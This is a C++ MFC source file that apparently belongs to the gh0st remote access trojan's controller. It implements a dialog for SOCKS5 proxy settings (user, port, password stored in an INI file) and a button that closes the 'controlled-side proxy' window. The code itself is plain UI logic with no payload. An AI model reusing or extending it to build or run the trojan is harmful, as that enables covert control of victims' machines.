// ClienttProxy.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "ClienttProxy.h"
#include "gh0stView.h"
#include "MainFrm.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CClienttProxy dialog


CClienttProxy::CClienttProxy(CWnd* pParent /*=NULL*/)
	: CDialog(CClienttProxy::IDD, pParent)
{
	//{{AFX_DATA_INIT(CClienttProxy)
	m_socks5 = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt(_T("代理信息"), _T("Socks5"), false);
	m_proxy_user = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString(_T("代理信息"), _T("帐号"), _T(""));
	m_proxy_port = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString(_T("代理信息"), _T("代理端口"), _T("1080"));
	m_proxy_pass = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString(_T("代理信息"), _T("密码"), _T(""));
	//}}AFX_DATA_INIT
}


void CClienttProxy::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CClienttProxy)
	DDX_Check(pDX, IDC_SOCKS5, m_socks5);
	DDX_Text(pDX, IDC_PROXY_USER, m_proxy_user);
	DDX_Text(pDX, IDC_PROXY_PORT, m_proxy_port);
	DDV_MaxChars(pDX, m_proxy_port, 65535);
	DDX_Text(pDX, IDC_PROXY_PASS, m_proxy_pass);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CClienttProxy, CDialog)
//{{AFX_MSG_MAP(CClienttProxy)
ON_BN_CLICKED(IDC_SOCKS5, OnSocks5)
ON_BN_CLICKED(IDC_EXIT_PROXY, OnExitProxy)
//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CClienttProxy message handlers

void CClienttProxy::OnSocks5() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	GetDlgItem(IDC_PROXY_USER)->EnableWindow(m_socks5);
	GetDlgItem(IDC_PROXY_PASS)->EnableWindow(m_socks5);
	
}

BOOL CClienttProxy::OnInitDialog() 
{
	CDialog::OnInitDialog();
	OnSocks5();
	// TODO: Add extra initialization here
	
	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}

void CClienttProxy::OnExitProxy() 
{
	// TODO: Add your control notification handler code here
	HWND King = ::FindWindow(NULL,_T("开启被控制端代理"));
	::PostMessage(King,WM_CLOSE,1,0);
}
